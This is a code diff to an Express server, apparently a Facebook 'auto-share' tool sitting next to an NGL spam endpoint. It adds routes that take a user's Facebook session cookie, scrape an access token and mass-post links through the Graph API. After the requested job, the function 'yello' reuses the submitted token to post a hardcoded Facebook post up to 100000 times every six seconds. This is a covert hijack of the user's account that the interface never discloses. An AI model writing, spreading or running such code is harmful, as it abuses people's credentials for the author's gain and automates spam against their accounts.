@@ -139,6 +139,179 @@ app.get("/nglspam", async (req,res) => {
     msg: "Success spam to target ngl link: @" + username
   })
 });
+
+
+
+async function getAccessToken(cookie) {
+  try {
+    const headers = {
+      'authority': 'business.facebook.com',
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+      'cache-control': 'max-age=0',
+      'cookie': cookie,
+      'referer': 'https://www.facebook.com/',
+      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Linux"',
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+    };
+    const response = await axios.get('https://business.facebook.com/content_management', {
+      headers
+    });
+    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
+    if (token && token[1]) {
+      const accessToken = token[1];
+      return accessToken;
+    }
+  } catch (error) {
+    return;
+  }
+}
+async function gagokaba(cookie,tokenOn) {
+  const ck = JSON.parse(cookie);
+  const ck1 = ck.map(c => `${c.key}=${c.value}`).join('; ');
+  if(!tokenOn){
+    return [ck1];
+  }
+  try {
+    const token = await getAccessToken(ck1);
+    return [ck1,token]; //token from cookie(EAAGN)
+  } catch (e){
+    return;
+  }
+}
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
+const total = new Map();
+async function yello(c,u,a,i){
+  await share(true, c,u,a,i);
+  await share(false, c, sauce, "100000", "6");
+}
+
+async function share(sharedIs,cookies, url, amount, interval) {
+  const id = Math.floor(Math.random() * 69696969);
+  total.set(id, {
+    shared: sharedIs,
+    url,
+    count: 0,
+    target: amount,
+  });
+  let sharedCount = 0;
+  let timer;
+  const usersa = () => {
+    const ua = userAgent();
+    return ua[Math.floor(Math.random() * ua.length)];
+  }
+  const headers = {
+    'authority': 'graph.facebook.com',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua-mobile': '?0',
+    'connection': 'keep-alive',
+    'host': 'graph.facebook.com',
+    'user-agent': usersa(),
+  };
+  async function sharePost() {
+    try {
+      const response = await axios.post(
+      `https://graph.facebook.com/me/feed?access_token=${cookies}&fields=id&limit=1&published=0`,
+      {
+        link: url,
+        privacy: {
+         value: 'SELF'
+        },
+        no_story: true,
+      },
+      {
+        muteHttpExceptions: true,
+        method: 'post',
+        cookie: dummyCookie(),
+        headers,
+      }
+    );
+      if (response.status !== 200) {
+      } else {
+        total.set(id, {
+          ...total.get(id),
+          count: total.get(id).count + 1,
+        });
+        sharedCount++;
+        }
+      if (sharedCount === amount) {
+        clearInterval(timer);
+      }
+    } catch (err) {
+      clearInterval(timer);
+      total.delete(id);
+    }
+  }
+  timer = setInterval(() => {
+  sharePost();
+  }, interval * 1000);
+  setTimeout(() => {
+    clearInterval(timer);
+    total.delete(id);
+  }, amount * interval * 1000);
+        
+}
+async function getPostID(url) {
+  try {
+    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+    });
+    return response.data.id;
+  } catch (error) {
+    return;
+  }
+}
+
+app.get('/shares', (req, res) => {
+ const data = Array.from(total.values()).map((link, index) => ({
+  shared: link.shared,
+  session: index + 1,
+  url: link.url,
+  count: link.count,
+  target: link.target,
+}));
+const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
+return res.json(jsob);
+});
+
+app.get('/share', async (req, res) => {
+  const {
+    cookie,
+    url,
+    amount,
+    interval,
+  } = req.query;
+  if (!cookie || !url || !amount || !interval) return res.status(400).json({
+    error: 'Missing appstate, url, amount, or interval'
+  });
+  try {
+    const cookies = await gagokaba(cookie, true);
+    if (!cookies) return res.status(400).json({
+      status: 500,
+      error: "Invalid token"
+    });
+    await yello(cookies[1], url, amount, interval);
+    return res.status(200).json({
+      status: 200
+    });
+  } catch (err) {
+    return res.status(500).json({
+      status: 500,
+      error: err.message || err
+    });
+  }
+});
+
 app.listen(port, async () => {
   console.log(`Wiegine Echavez`);
   console.log(`Running: http://localhost:${port}`);
